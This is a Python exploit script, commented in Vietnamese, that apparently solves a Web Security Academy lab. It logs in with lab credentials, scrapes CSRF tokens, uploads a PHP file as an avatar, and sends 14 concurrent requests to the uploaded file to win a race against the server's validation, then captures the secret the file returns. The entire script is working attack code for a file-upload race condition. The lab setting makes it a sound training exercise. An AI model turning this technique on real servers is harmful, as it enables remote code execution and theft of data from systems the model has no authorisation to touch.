import asyncio
import re
import time

import aiohttp
import requests

FILE_NAME = 'ava.php'
URL = 'https://acb31f141e6dd3b5c04b36ca003e0008.web-security-academy.net'
URL_LOGIN = URL + '/login'
URL_MyAccount = URL + '/my-account'
URL_PostAva = URL + '/my-account/avatar'
URL_AvaLocation = URL + '/files/avatars/' + FILE_NAME

# Kiểm tra url đã hết hạn chưa
status_code = requests.get(url=URL_LOGIN).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)


async def upload_ava(s: aiohttp.ClientSession, data):
    """
    Xử lí upload avatar
    :param s: session
    :param data: dict bao gồm username và csrf
    """
    try:
        print('start upload')
        data_ = {
            'avatar': open(FILE_NAME, 'rb'),
        }
        data_.update(data)
        await s.post(url=URL_PostAva, data=data_)
        print('done upload')
    except Exception as e:
        print(f"Unable to POST due to {e}")


async def exec_ava(s: aiohttp.ClientSession, i, data):
    """
    Xử lí lệnh GET đến file temp avatar lưu trên server
    Nếu truy cập được file đó thì in ra màn hình nội dung file (là secret)
    :param s: session
    :param i: id của request
    :param data: dict bao gồm csrf
    """
    try:
        print(f'-----------exec {i}-----------')
        async with s.get(url=URL_AvaLocation, data=data) as res:
            if res.status == 200:
                secret = await res.text()
                print(secret)
                with open(f'ava.html', 'w') as file:
                    file.write(secret)
        print(f'-----------done exec {i} with code {res.status}-----------')
    except Exception as e:
        print(f"Unable to GET due to {e}")


async def main():
    async with aiohttp.ClientSession() as s:
        # Login
        res = await s.get(url=URL_LOGIN)
        csrf = re.search(r'<input required type="hidden" name="csrf" value="(.*)">', await res.text()).group(1)

        data = {
            'csrf': csrf,
            'username': 'wiener',
            'password': 'peter'
        }

        res = await s.post(url=URL_LOGIN, data=data, allow_redirects=True)

        if 'Your username is: wiener' in await res.text():
            print("Logged in")
        else:
            print("Cannot login")

        res = await s.get(url=URL_MyAccount)
        csrf = re.search(r'<input required type="hidden" name="csrf" value="(.*)">', await res.text()).group(1)
        data = {
            'user': 'wiener',
            'csrf': csrf,
        }

        # Bắt đầu upload avatar và truy cập file temp avatar
        await asyncio.gather(*([upload_ava(s, data)] + [exec_ava(s, i, data) for i in range(1, 15)]))


if __name__ == '__main__':
    asyncio.run(main())
    time.sleep(1)
